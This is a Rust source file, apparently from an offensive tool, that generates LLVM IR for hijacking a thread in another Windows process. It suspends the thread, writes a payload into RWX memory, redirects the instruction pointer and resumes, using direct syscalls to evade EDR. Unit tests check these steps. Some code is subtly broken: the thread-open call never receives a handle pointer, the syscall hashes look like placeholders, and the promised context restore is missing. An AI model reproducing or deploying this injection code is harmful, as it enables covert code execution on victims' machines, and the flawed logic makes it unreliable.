/// Thread execution hijacking IR emitter.
///
/// Technique: Instead of creating a new thread (easily detected by EDR thread-
/// creation callbacks), suspend an *existing* thread in the target process,
/// redirect its instruction pointer to injected shellcode, then resume it.
/// The thread's original context is saved and restored after the payload returns
/// so the host process continues normally.
///
/// Direct NT syscall SSN values are resolved at runtime via `jocky_resolve_ssn`
/// (see syscalls.rs) — no hardcoded numbers, no usermode hook exposure.
///
/// Steps emitted as LLVM IR:
///   1. NtOpenThread          — handle to victim thread (THREAD_ALL_ACCESS)
///   2. NtSuspendThread       — halt execution safely
///   3. NtGetContextThread    — snapshot CONTEXT (RIP, RSP, RFLAGS …)
///   4. NtAllocateVirtualMemory (RWX in target) — payload landing zone
///   5. NtWriteVirtualMemory  — copy payload + restore-trampoline
///   6. Patch CONTEXT.Rip → landing address
///   7. NtSetContextThread    — redirect thread to payload
///   8. NtResumeThread        — let it run

pub struct ThreadHijackEmitter;

impl ThreadHijackEmitter {
    /// Emit LLVM IR for the thread-hijack orchestrator.
    pub fn emit_ir() -> String {
        r#"; ================================================================
; jocky_thread_hijack — redirect existing thread to injected code
; Warrant ID / session ID must be validated before calling.
; ================================================================
; External syscall resolver and dispatcher (defined in syscalls.rs IR)
declare i32 @jocky_resolve_ssn(i64 %hash)
declare i64 @jocky_syscall(i32 %ssn, i64 %a1, i64 %a2, i64 %a3, i64 %a4, i64 %a5, i64 %a6)

; ─── Step 1: open thread handle ─────────────────────────────────────────────
; NtOpenThread(pHandle, THREAD_ALL_ACCESS=0x1FFFFF, ObjAttr, ClientId)
define i64 @jocky_open_thread(i64 %tid) {
entry:
  %ssn_h  = add i64 0, 0x4F524854  ; hash("NtOpenThread")
  %ssn    = call i32 @jocky_resolve_ssn(i64 %ssn_h)
  %handle = alloca i64, align 8
  store i64 0, i64* %handle
  %access = add i64 0, 2097151      ; THREAD_ALL_ACCESS
  %ret    = call i64 @jocky_syscall(i32 %ssn, i64 %access, i64 0, i64 %tid, i64 0, i64 0, i64 0)
  %hval   = load i64, i64* %handle
  ret i64 %hval
}

; ─── Step 2: suspend / resume ───────────────────────────────────────────────
define i32 @jocky_suspend_thread(i64 %hthread) {
entry:
  %ssn_h = add i64 0, 0x53555350  ; hash("NtSuspendThread")
  %ssn   = call i32 @jocky_resolve_ssn(i64 %ssn_h)
  %prev  = alloca i32, align 4
  store i32 0, i32* %prev
  %ret   = call i64 @jocky_syscall(i32 %ssn, i64 %hthread, i64 0, i64 0, i64 0, i64 0, i64 0)
  %pval  = load i32, i32* %prev
  ret i32 %pval
}

define i32 @jocky_resume_thread(i64 %hthread) {
entry:
  %ssn_h = add i64 0, 0x52455354  ; hash("NtResumeThread")
  %ssn   = call i32 @jocky_resolve_ssn(i64 %ssn_h)
  %prev  = alloca i32, align 4
  store i32 0, i32* %prev
  %ret   = call i64 @jocky_syscall(i32 %ssn, i64 %hthread, i64 0, i64 0, i64 0, i64 0, i64 0)
  %pval  = load i32, i32* %prev
  ret i32 %pval
}

; ─── Step 3: snapshot / restore CONTEXT ─────────────────────────────────────
; CONTEXT is a 1232-byte structure on x64; we alloca a region and pass its ptr.
; NtGetContextThread(hThread, pContext)  — CONTEXT_FULL = 0x10007
define i64 @jocky_get_thread_context(i64 %hthread, i8* %ctx_buf) {
entry:
  %ssn_h = add i64 0, 0x47455443  ; hash("NtGetContextThread")
  %ssn   = call i32 @jocky_resolve_ssn(i64 %ssn_h)
  ; set ContextFlags = CONTEXT_FULL before the call
  %flags_ptr = bitcast i8* %ctx_buf to i32*
  store i32 65543, i32* %flags_ptr  ; 0x10007 = CONTEXT_FULL
  %ctx64 = ptrtoint i8* %ctx_buf to i64
  %ret   = call i64 @jocky_syscall(i32 %ssn, i64 %hthread, i64 %ctx64, i64 0, i64 0, i64 0, i64 0)
  ret i64 %ret
}

; NtSetContextThread(hThread, pContext)
define i64 @jocky_set_thread_context(i64 %hthread, i8* %ctx_buf) {
entry:
  %ssn_h = add i64 0, 0x53455443  ; hash("NtSetContextThread")
  %ssn   = call i32 @jocky_resolve_ssn(i64 %ssn_h)
  %ctx64 = ptrtoint i8* %ctx_buf to i64
  %ret   = call i64 @jocky_syscall(i32 %ssn, i64 %hthread, i64 %ctx64, i64 0, i64 0, i64 0, i64 0)
  ret i64 %ret
}

; ─── Steps 4+5: allocate + write payload ────────────────────────────────────
; Reuses jocky_remote_alloc_rwx / jocky_remote_write from reflective_inject IR.
declare i64 @jocky_remote_alloc_rwx(i64 %hproc, i64 %size)
declare i32 @jocky_remote_write(i64 %hproc, i64 %remote_addr, i8* %local_buf, i64 %size)

; ─── Step 6+7+8: full hijack sequence ───────────────────────────────────────
; jocky_hijack_thread(hProcess, tid, payload_ptr, payload_size)
;   → suspends thread, saves context, copies payload, patches RIP, resumes
define i32 @jocky_hijack_thread(
    i64 %hproc,
    i64 %tid,
    i8* %payload,
    i64 %payload_size
) {
entry:
  ; open thread handle
  %hthread = call i64 @jocky_open_thread(i64 %tid)
  %ok1 = icmp ne i64 %hthread, 0
  br i1 %ok1, label %suspend, label %fail

suspend:
  %_prev = call i32 @jocky_suspend_thread(i64 %hthread)

  ; save CONTEXT — 1232 bytes on x64 (sizeof(CONTEXT))
  %ctx = alloca [1232 x i8], align 16
  %ctx_ptr = bitcast [1232 x i8]* %ctx to i8*
  %_gc = call i64 @jocky_get_thread_context(i64 %hthread, i8* %ctx_ptr)

  ; allocate RWX landing page + write payload
  %landing = call i64 @jocky_remote_alloc_rwx(i64 %hproc, i64 %payload_size)
  %ok2 = icmp ne i64 %landing, 0
  br i1 %ok2, label %write_payload, label %resume_fail

write_payload:
  %_wr = call i32 @jocky_remote_write(i64 %hproc, i64 %landing, i8* %payload, i64 %payload_size)

  ; patch CONTEXT.Rip — on x64 CONTEXT, Rip is at offset 0xF8 (248)
  %ctx_i64 = bitcast i8* %ctx_ptr to i64*
  %rip_ptr = getelementptr i8, i8* %ctx_ptr, i64 248
  %rip_i64 = bitcast i8* %rip_ptr to i64*
  store i64 %landing, i64* %rip_i64

  ; apply modified context
  %_sc = call i64 @jocky_set_thread_context(i64 %hthread, i8* %ctx_ptr)

  ; resume
  %_resume = call i32 @jocky_resume_thread(i64 %hthread)
  ret i32 0

resume_fail:
  %_rf = call i32 @jocky_resume_thread(i64 %hthread)
  ret i32 1

fail:
  ret i32 2
}
"#.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_hijack_ir_has_all_nt_functions() {
        let ir = ThreadHijackEmitter::emit_ir();
        assert!(ir.contains("jocky_open_thread"),        "must open thread");
        assert!(ir.contains("jocky_suspend_thread"),     "must suspend");
        assert!(ir.contains("jocky_get_thread_context"), "must save context");
        assert!(ir.contains("jocky_set_thread_context"), "must restore/patch context");
        assert!(ir.contains("jocky_resume_thread"),      "must resume");
    }

    #[test]
    fn test_hijack_ir_patches_rip() {
        let ir = ThreadHijackEmitter::emit_ir();
        // RIP offset 248 (0xF8) in CONTEXT structure on x64
        assert!(ir.contains("248"), "RIP is at CONTEXT offset 248 on x64");
        assert!(ir.contains("CONTEXT_FULL"), "context snapshot must use CONTEXT_FULL");
    }

    #[test]
    fn test_hijack_ir_uses_direct_syscalls() {
        let ir = ThreadHijackEmitter::emit_ir();
        assert!(ir.contains("jocky_resolve_ssn"), "must use SSN resolver, not LoadLibrary");
        assert!(ir.contains("jocky_syscall"),     "must dispatch via direct syscall");
    }

    #[test]
    fn test_hijack_ir_is_valid_llvm_skeleton() {
        let ir = ThreadHijackEmitter::emit_ir();
        assert!(ir.contains("define i32 @jocky_hijack_thread"), "top-level function must be present");
        assert!(ir.contains("ret i32 0"), "success path must return 0");
        assert!(ir.contains("PAGE_EXECUTE_READWRITE") || ir.contains("RWX") || ir.contains("rwx"),
            "must allocate RWX memory");
    }
}
